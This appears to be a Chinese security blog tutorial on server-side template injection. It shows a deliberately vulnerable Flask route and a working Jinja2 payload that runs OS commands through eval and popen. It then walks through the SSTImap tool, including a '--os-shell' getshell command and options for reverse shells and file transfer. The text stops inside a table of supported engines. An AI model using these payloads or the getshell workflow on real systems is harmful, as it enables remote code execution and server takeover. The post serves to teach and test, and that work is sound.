#  SSTI模板注入漏洞详解（附一键getshell工具）   
原创 Z0安全  Z0安全   2025-01-02 08:23  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试。由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，请遵守网络安全法律。本次仅用于测试，请完成测试后24小时删除，请勿用于商业用途。  
  
  
### 01.简介  
#### 什么是SSTI：  
  
SSTI漏洞的全称是服务器端模板注入（Server-Side Template Injection）漏洞。这是一种在服务器端模板引擎中注入恶意代码的攻击方式，攻击者可以利用这个漏洞执行任意命令、访问敏感数据或控制服务器。SSTI漏洞在Web应用中较为常见，尤其是在使用模板引擎渲染用户输入的场景中。  
  
通俗来说，它是一种web漏洞，出现在使用模板引擎的Web应用程序中。模板引擎的作用是将动态数据（比如用户输入）和静态模板（比如HTML代码）结合起来，生成最终的网页内容  
#### SSTI主要影响的框架有 ：  
  
**python框架**  
：jinja2、Tornado 、Django，  
  
**php框架**  
：Smarty、Twig，Smarty  
  
**java框架**  
：Jade、Velocity、JSF  
#### 漏洞产生的根本原因：  
  
由于开发者在实现应用程序时未能正确地处理用户输入  
### 02.漏洞演示  
  
漏洞代码  
```
from flask importFlask, request, render_template_stringapp =Flask(__name__)@app.route('/hello')defhello():    name = request.args.get('name','World')    template =f'Hello, {name}'return render_template_string(template)if __name__ =='__main__':    app.run()    
```  
  
这段Python代码是一个简单的Flask Web应用程序，用于演示如何从查询字符串中获取一个名为name  
的参数，并将其值插入到一个模板中，然后渲染并返回给用户。这个直接将用户输入 render_template_string(template)插入到模板中，存在SSTI漏洞。  
  
启动后本地访问  
  
http://127.0.0.1:5000/hello?name=1  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3ClhvEA8OWp6hVLABicDnZMk9rnjsiaMQJ72BHGIWDvvhC2ZmYRZw3kf7aNNEGpxIWA26QB1zHiak72M62ru7oJVA/640?wx_fmt=png&from=appmsg "")  
  
  
对于Flask默认的模板引擎的Payload：  
```
{{ 2*2 }}{{ config }}{{ self }}
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3ClhvEA8OWp6hVLABicDnZMk9rnjsiaMQJWcicoQTYAjUFsUXpOCUzrjZssgf3JGQ0lkbl1jrRoWRWO88viaZJvykw/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3ClhvEA8OWp6hVLABicDnZMk9rnjsiaMQJWWcvansKX36iao9ovlrguDR2MZoeomoibljLJLb87qHVreByRibFWhUiaQ/640?wx_fmt=png&from=appmsg "")  
  
漏洞利用代码：  
```
{{lipsum.__globals__['__builtins__']['eval']('__import__("os").popen("dir").read()')}}
```  
  
  
image-20250102150640299  
  
常用的利用代码还有很多，可以根据实际情况进行识别  
### 03.模板注入漏洞工具--SSTImap  
  
SSTImap是一款功能强大的渗透测试工具，该工具提供了一个交互式接口，可以帮助广大研究人员以自动化的形式检查网站的代码注入和服务器端模版注入漏洞。除此之外，该工具甚至还可以帮助我们自动利用这些发现的漏洞，从而访问目标服务器（主机）操作系统，来源：@vladko312。  
  
切换到项目目录中，并使用pip命令和项目提供的requirements.txt安装该工具所需的  
```
cd SSTImappip install  -r  requirements.txt
```  
#### 使用教程：  
  
扫描漏洞：  
```
python sstimap.py -u "http://127.0.0.1:5000/hello?name=1"
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3ClhvEA8OWp6hVLABicDnZMk9rnjsiaMQJE6FciaMeLOoUvbhGnvrGVWtJeCbDaA09GDxoC6JPcdviafM2tS4sQ8gg/640?wx_fmt=png&from=appmsg "")  
  
这个输出信息表明 SSTImap  
 工具已经成功识别了一个服务器端模板注入（SSTI）漏洞，并且确认了注入点。以下是输出信息的详细解释：  
- • **Jinja2 plugin has confirmed injection with tag ‘*’**  
: 这意味着 Jinja2 模板引擎插件已经确认可以通过使用 ‘*’ 标签进行注入。  
  
- • **SSTImap identified the following injection point**  
: 这部分列出了注入点的详细信息。  
  
- • **Shell command execution: ok**  
: 可以执行 shell 命令。  
  
- • **Bind and reverse shell: ok**  
: 可以绑定和反向 shell。  
  
- • **File write: ok**  
: 可以写入文件。  
  
- • **File read: ok**  
: 可以读取文件。  
  
- • **Code evaluation: ok, python code**  
: 可以执行 Python 代码。  
  
- • **Query parameter: name**  
: 注入发生在 URL 查询参数 name  
 中。  
  
- • **Engine: Jinja2**  
: 目标应用使用的是 Jinja2 模板引擎。  
  
- • **Injection: ***: 注入使用的特殊字符或标签是 *  
。  
  
- • **Context: text**  
: 注入发生在文本上下文中。  
  
- • **OS: nt-win32**  
: 目标操作系统是 Windows。  
  
- • **Technique: render**  
: 使用的是渲染技术进行注入。  
  
- • **Capabilities**  
: 这部分列出了通过这个注入点可以执行的操作。  
  
- • **Rerun SSTImap providing one of the following options**  
: 这部分列出了你可以通过重新运行 SSTImap  
 并提供以下选项来执行的操作：  
  
- • **–os-shell**  
: 提供一个交互式的操作系统 shell。  
  
- • **–os-cmd**  
: 执行一个操作系统命令。  
  
- • **–eval-shell**  
: 在模板引擎的基础语言上提供一个交互式 shell。  
  
- • **–eval-cmd**  
: 在模板引擎的基础语言中执行代码。  
  
- • **–tpl-shell**  
: 在模板引擎上提供一个交互式 shell。  
  
- • **–tpl-cmd**  
: 在模板引擎中注入代码。  
  
- • **–bind-shell PORT**  
: 连接到绑定到目标端口的 shell。  
  
- • **–reverse-shell HOST PORT**  
: 将 shell 发送到攻击者的端口。  
  
- • **–upload LOCAL REMOTE**  
: 上传文件到服务器。  
  
- • **–download REMOTE LOCAL**  
: 从服务器下载文件。  
  
-   
- 获取Shell：  
```
python sstimap.py -u "http://127.0.0.1:5000/hello?name=1" --os-shell 
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/3ClhvEA8OWp6hVLABicDnZMk9rnjsiaMQJnSRgKe5QibXXRHQyuZbUpdlcj8K2N6uXmeopQhKfOgWGNLzbFRdIs6A/640?wx_fmt=png&from=appmsg "")  
  
  
#### 支持的模版引擎  
  
SSTImap支持多种模版引擎和类eval()注入，列表如下：  
  
<table><thead><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><strong style="text-align:left;line-height:1.75;color:rgba(15, 76, 129, 1);font-weight:bold;"><span leaf="">引擎</span></strong></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><strong style="text-align:left;line-height:1.75;color:rgba(15, 76, 129, 1);font-weight:bold;"><span leaf="">远程代码执行</span></strong></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><strong style="text-align:left;line-height:1.75;color:rgba(15, 76, 129, 1);font-weight:bold;"><span leaf="">盲注</span></strong></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><strong style="text-align:left;line-height:1.75;color:rgba(15, 76, 129, 1);font-weight:bold;"><span leaf="">代码评估</span></strong></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><strong style="text-align:left;line-height:1.75;color:rgba(15, 76, 129, 1);font-weight:bold;"><span leaf="">文件读取</span></strong></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><strong style="text-align:left;line-height:1.75;color:rgba(15, 76, 129, 1);font-weight:bold;"><span leaf="">文件写入</span></strong></td></tr></thead><tbody><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Mako</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Python</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Jinja2</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Python</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Python (code eval)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Python</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Tornado</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Python</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Nunjucks</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Pug</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">doT</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Marko</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript (code eval)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Dust (&lt;= </span><span style="text-align:left;line-height:1.75;color:#576b95;"><span leaf="">dustjs-helpers@1.5.0</span></span><span leaf="">)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">EJS</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">JavaScript</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Ruby (code eval)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Ruby</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Slim</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Ruby</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">ERB</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Ruby</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Smarty (unsecured)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">PHP</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Smarty (secured)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">PHP</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">PHP (code eval)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">PHP</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td></tr><tr><td data-colwidth="119" width="119" valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">Twig (&lt;=1.19)</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid #dfdfdf;padding:0.25em 0.5em;color:#3f3f3f;"><section style="margin-top: 8px;margin-bottom: 16px;"><span leaf="">✓</span></section></td><td valign="top" style="text-align:left;line-height:1.75;border:1px solid 